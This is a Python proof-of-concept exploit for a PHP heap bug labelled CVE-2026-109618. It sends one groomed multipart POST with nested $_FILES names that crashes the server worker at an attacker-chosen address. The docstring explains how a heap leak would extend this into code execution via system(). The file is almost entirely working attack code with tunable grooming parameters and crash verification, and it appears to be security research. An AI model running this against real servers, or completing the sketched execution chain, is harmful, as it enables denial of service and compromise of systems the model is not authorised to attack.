#!/usr/bin/env python3
# INDEX: groomed $_files stale-bucket val -> controlled-address shutdown crash | cli apache | stock non-asan, single request
"""stale_bucket_groom_crash.py - CVE-2026-109618, stock-build single-target arm.

Single multipart POST, no session, no app: a nested $_FILES upload makes the
pre-RINIT parse OOM at the key zend_string_init() inside
_zend_hash_str_add_or_update_i AFTER nNumUsed++ counted the bucket. Request
shutdown's zend_array_destroy then walks the counted-but-uninitialized bucket
and runs i_zval_ptr_dtor on its stale `val` (GC_DELREF: `subl $1,(ptr)`).

On a stock (non-ASan) build the stale `val.value` is the reused arData chunk's
prior content, so the crash-vs-survive and the fault ADDRESS are heap-state
dependent (unreliable alone). The groom fixes both: a flood of duplicate-named
POST fields (the second of each pair frees the first ~288-byte, 320-bin value)
plus pad-calibrated OOM placement makes the dispatched pointer track the
file-part index-name fill byte. Verified 8.4.26 `php -S`: at the calibrated pad
the worker dies 24/24 with the fault address = fill*8 (0x43.. for fill 'C',
0x61.. for 'a') -- a reliable, attacker-DETERMINED-address shutdown crash from
one <8 MiB body.

This is the controlled-bytes stage, not RCE: the index-name channel drops NUL,
so it cannot carry a live heap pointer, and a valid target address needs a leak
(ASLR). With a heap leak + a binary-safe (field-value) groom route, the same
GC_DELREF->rc_dtor_func path is a destructor dispatch (forge refcount=1 ->
DELREF 0 -> system()); that composition is not wired here.

Usage:
    python3 -I poc/bugs/stale_bucket_groom_crash.py <url> [--fill C] [--pad 250]
        [--pairs 60] [--idx-len 262144] [--path /poc.php] [--alive-path /index.php]
"""
from __future__ import annotations

import argparse
import os
import sys
import time

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http  # noqa: E402
from common.multipart import part, terminator, PHP2SHELL_BOUNDARY_B as BND  # noqa: E402

GROOM_VAL = b"A" * 288   # 288 + 0x19 = 313 -> ZendMM 320 bin (= min mixed-HT arData size)
PAD_FIELD = 16384
IDX_LEN = 262144


def build_body(fill, n_pad, n_pairs, idx_len=IDX_LEN, fill2=b"D"):
    """Two file parts with DISTINCT index fills: part1 (`fill`) seats u[fill..] so
    u is not STATIC_KEYS; part2 (`fill2`) is the deadly new u-key whose OOM leaves
    the counted bucket stale. The dispatched val.value tracks part1's `fill`."""
    chunks = []
    for i in range(n_pairs):                       # flood free_slot[bin320] with freed all-A chunks
        chunks.append(part(f"g{i}", GROOM_VAL, boundary=BND))
        chunks.append(part(f"g{i}", GROOM_VAL, boundary=BND))
    for i in range(n_pad):                         # retained pads: calibrate where the OOM crosses
        chunks.append(part(f"p{i}", b"P" * PAD_FIELD, boundary=BND))
    f1 = fill if isinstance(fill, bytes) else fill.encode()
    f2 = fill2 if isinstance(fill2, bytes) else fill2.encode()
    chunks.append(part(b"u[" + f1 * idx_len + b"][k]", b"x",
                       filename="f.txt", ctype="text/plain", boundary=BND))
    chunks.append(part(b"u[" + f2 * idx_len + b"][k]", b"y",
                       filename="g.txt", ctype="text/plain", boundary=BND))
    chunks.append(terminator(BND))
    return b"".join(chunks)


def alive(base, path, timeout=8):
    s, _ = http(base + path, timeout=timeout)
    return s == 200


def run(a):
    base = a.url.rstrip("/")
    ap = "/" + a.alive_path.lstrip("/")
    body = build_body(a.fill, a.pad, a.pairs, a.idx_len)
    ct = "multipart/form-data; boundary=" + BND.decode()
    print(f"[stale_bucket_groom_crash] POST {base}{a.path}  fill={a.fill!r} pad={a.pad} "
          f"pairs={a.pairs}  {len(body)} wire bytes ({len(body)/1048576:.2f} MiB)")
    if not alive(base, ap):
        print(f"[stale_bucket_groom_crash] target not answering {ap} before arm; aborting")
        return
    t0 = time.time()
    s, b = http(base + a.path, data=body,
                headers={"Content-Type": ct, "Content-Length": str(len(body))},
                timeout=120)
    al = alive(base, ap)
    print(f"[stale_bucket_groom_crash] HTTP={s}  worker {'alive' if al else 'DEAD'}  "
          f"{time.time()-t0:.1f}s")
    if not al:
        f = a.fill if isinstance(a.fill, str) else a.fill.decode()
        print("[stale_bucket_groom_crash] shutdown walked the stale $_FILES bucket; i_zval_ptr_dtor")
        print(f"[stale_bucket_groom_crash] dispatched val.value = 0x{ord(f):02x}*8 (fault at the")
        print("[stale_bucket_groom_crash] attacker fill byte). gdb check (your own lab):")
        print("[stale_bucket_groom_crash]   SIGSEGV subl $1,(%rdi) in zend_array_destroy, rdi=fill*8")
    else:
        print("[stale_bucket_groom_crash] survived -- recalibrate --pad (sweep +-a few) / --pairs")


def main():
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("url")
    p.add_argument("--fill", default="C", help="index-name fill byte -> fault address bytes")
    p.add_argument("--pad", type=int, default=250)
    p.add_argument("--pairs", type=int, default=60)
    p.add_argument("--idx-len", type=int, default=IDX_LEN)
    p.add_argument("--path", default="/poc.php")
    p.add_argument("--alive-path", default="/index.php")
    run(p.parse_args())


if __name__ == "__main__":
    main()
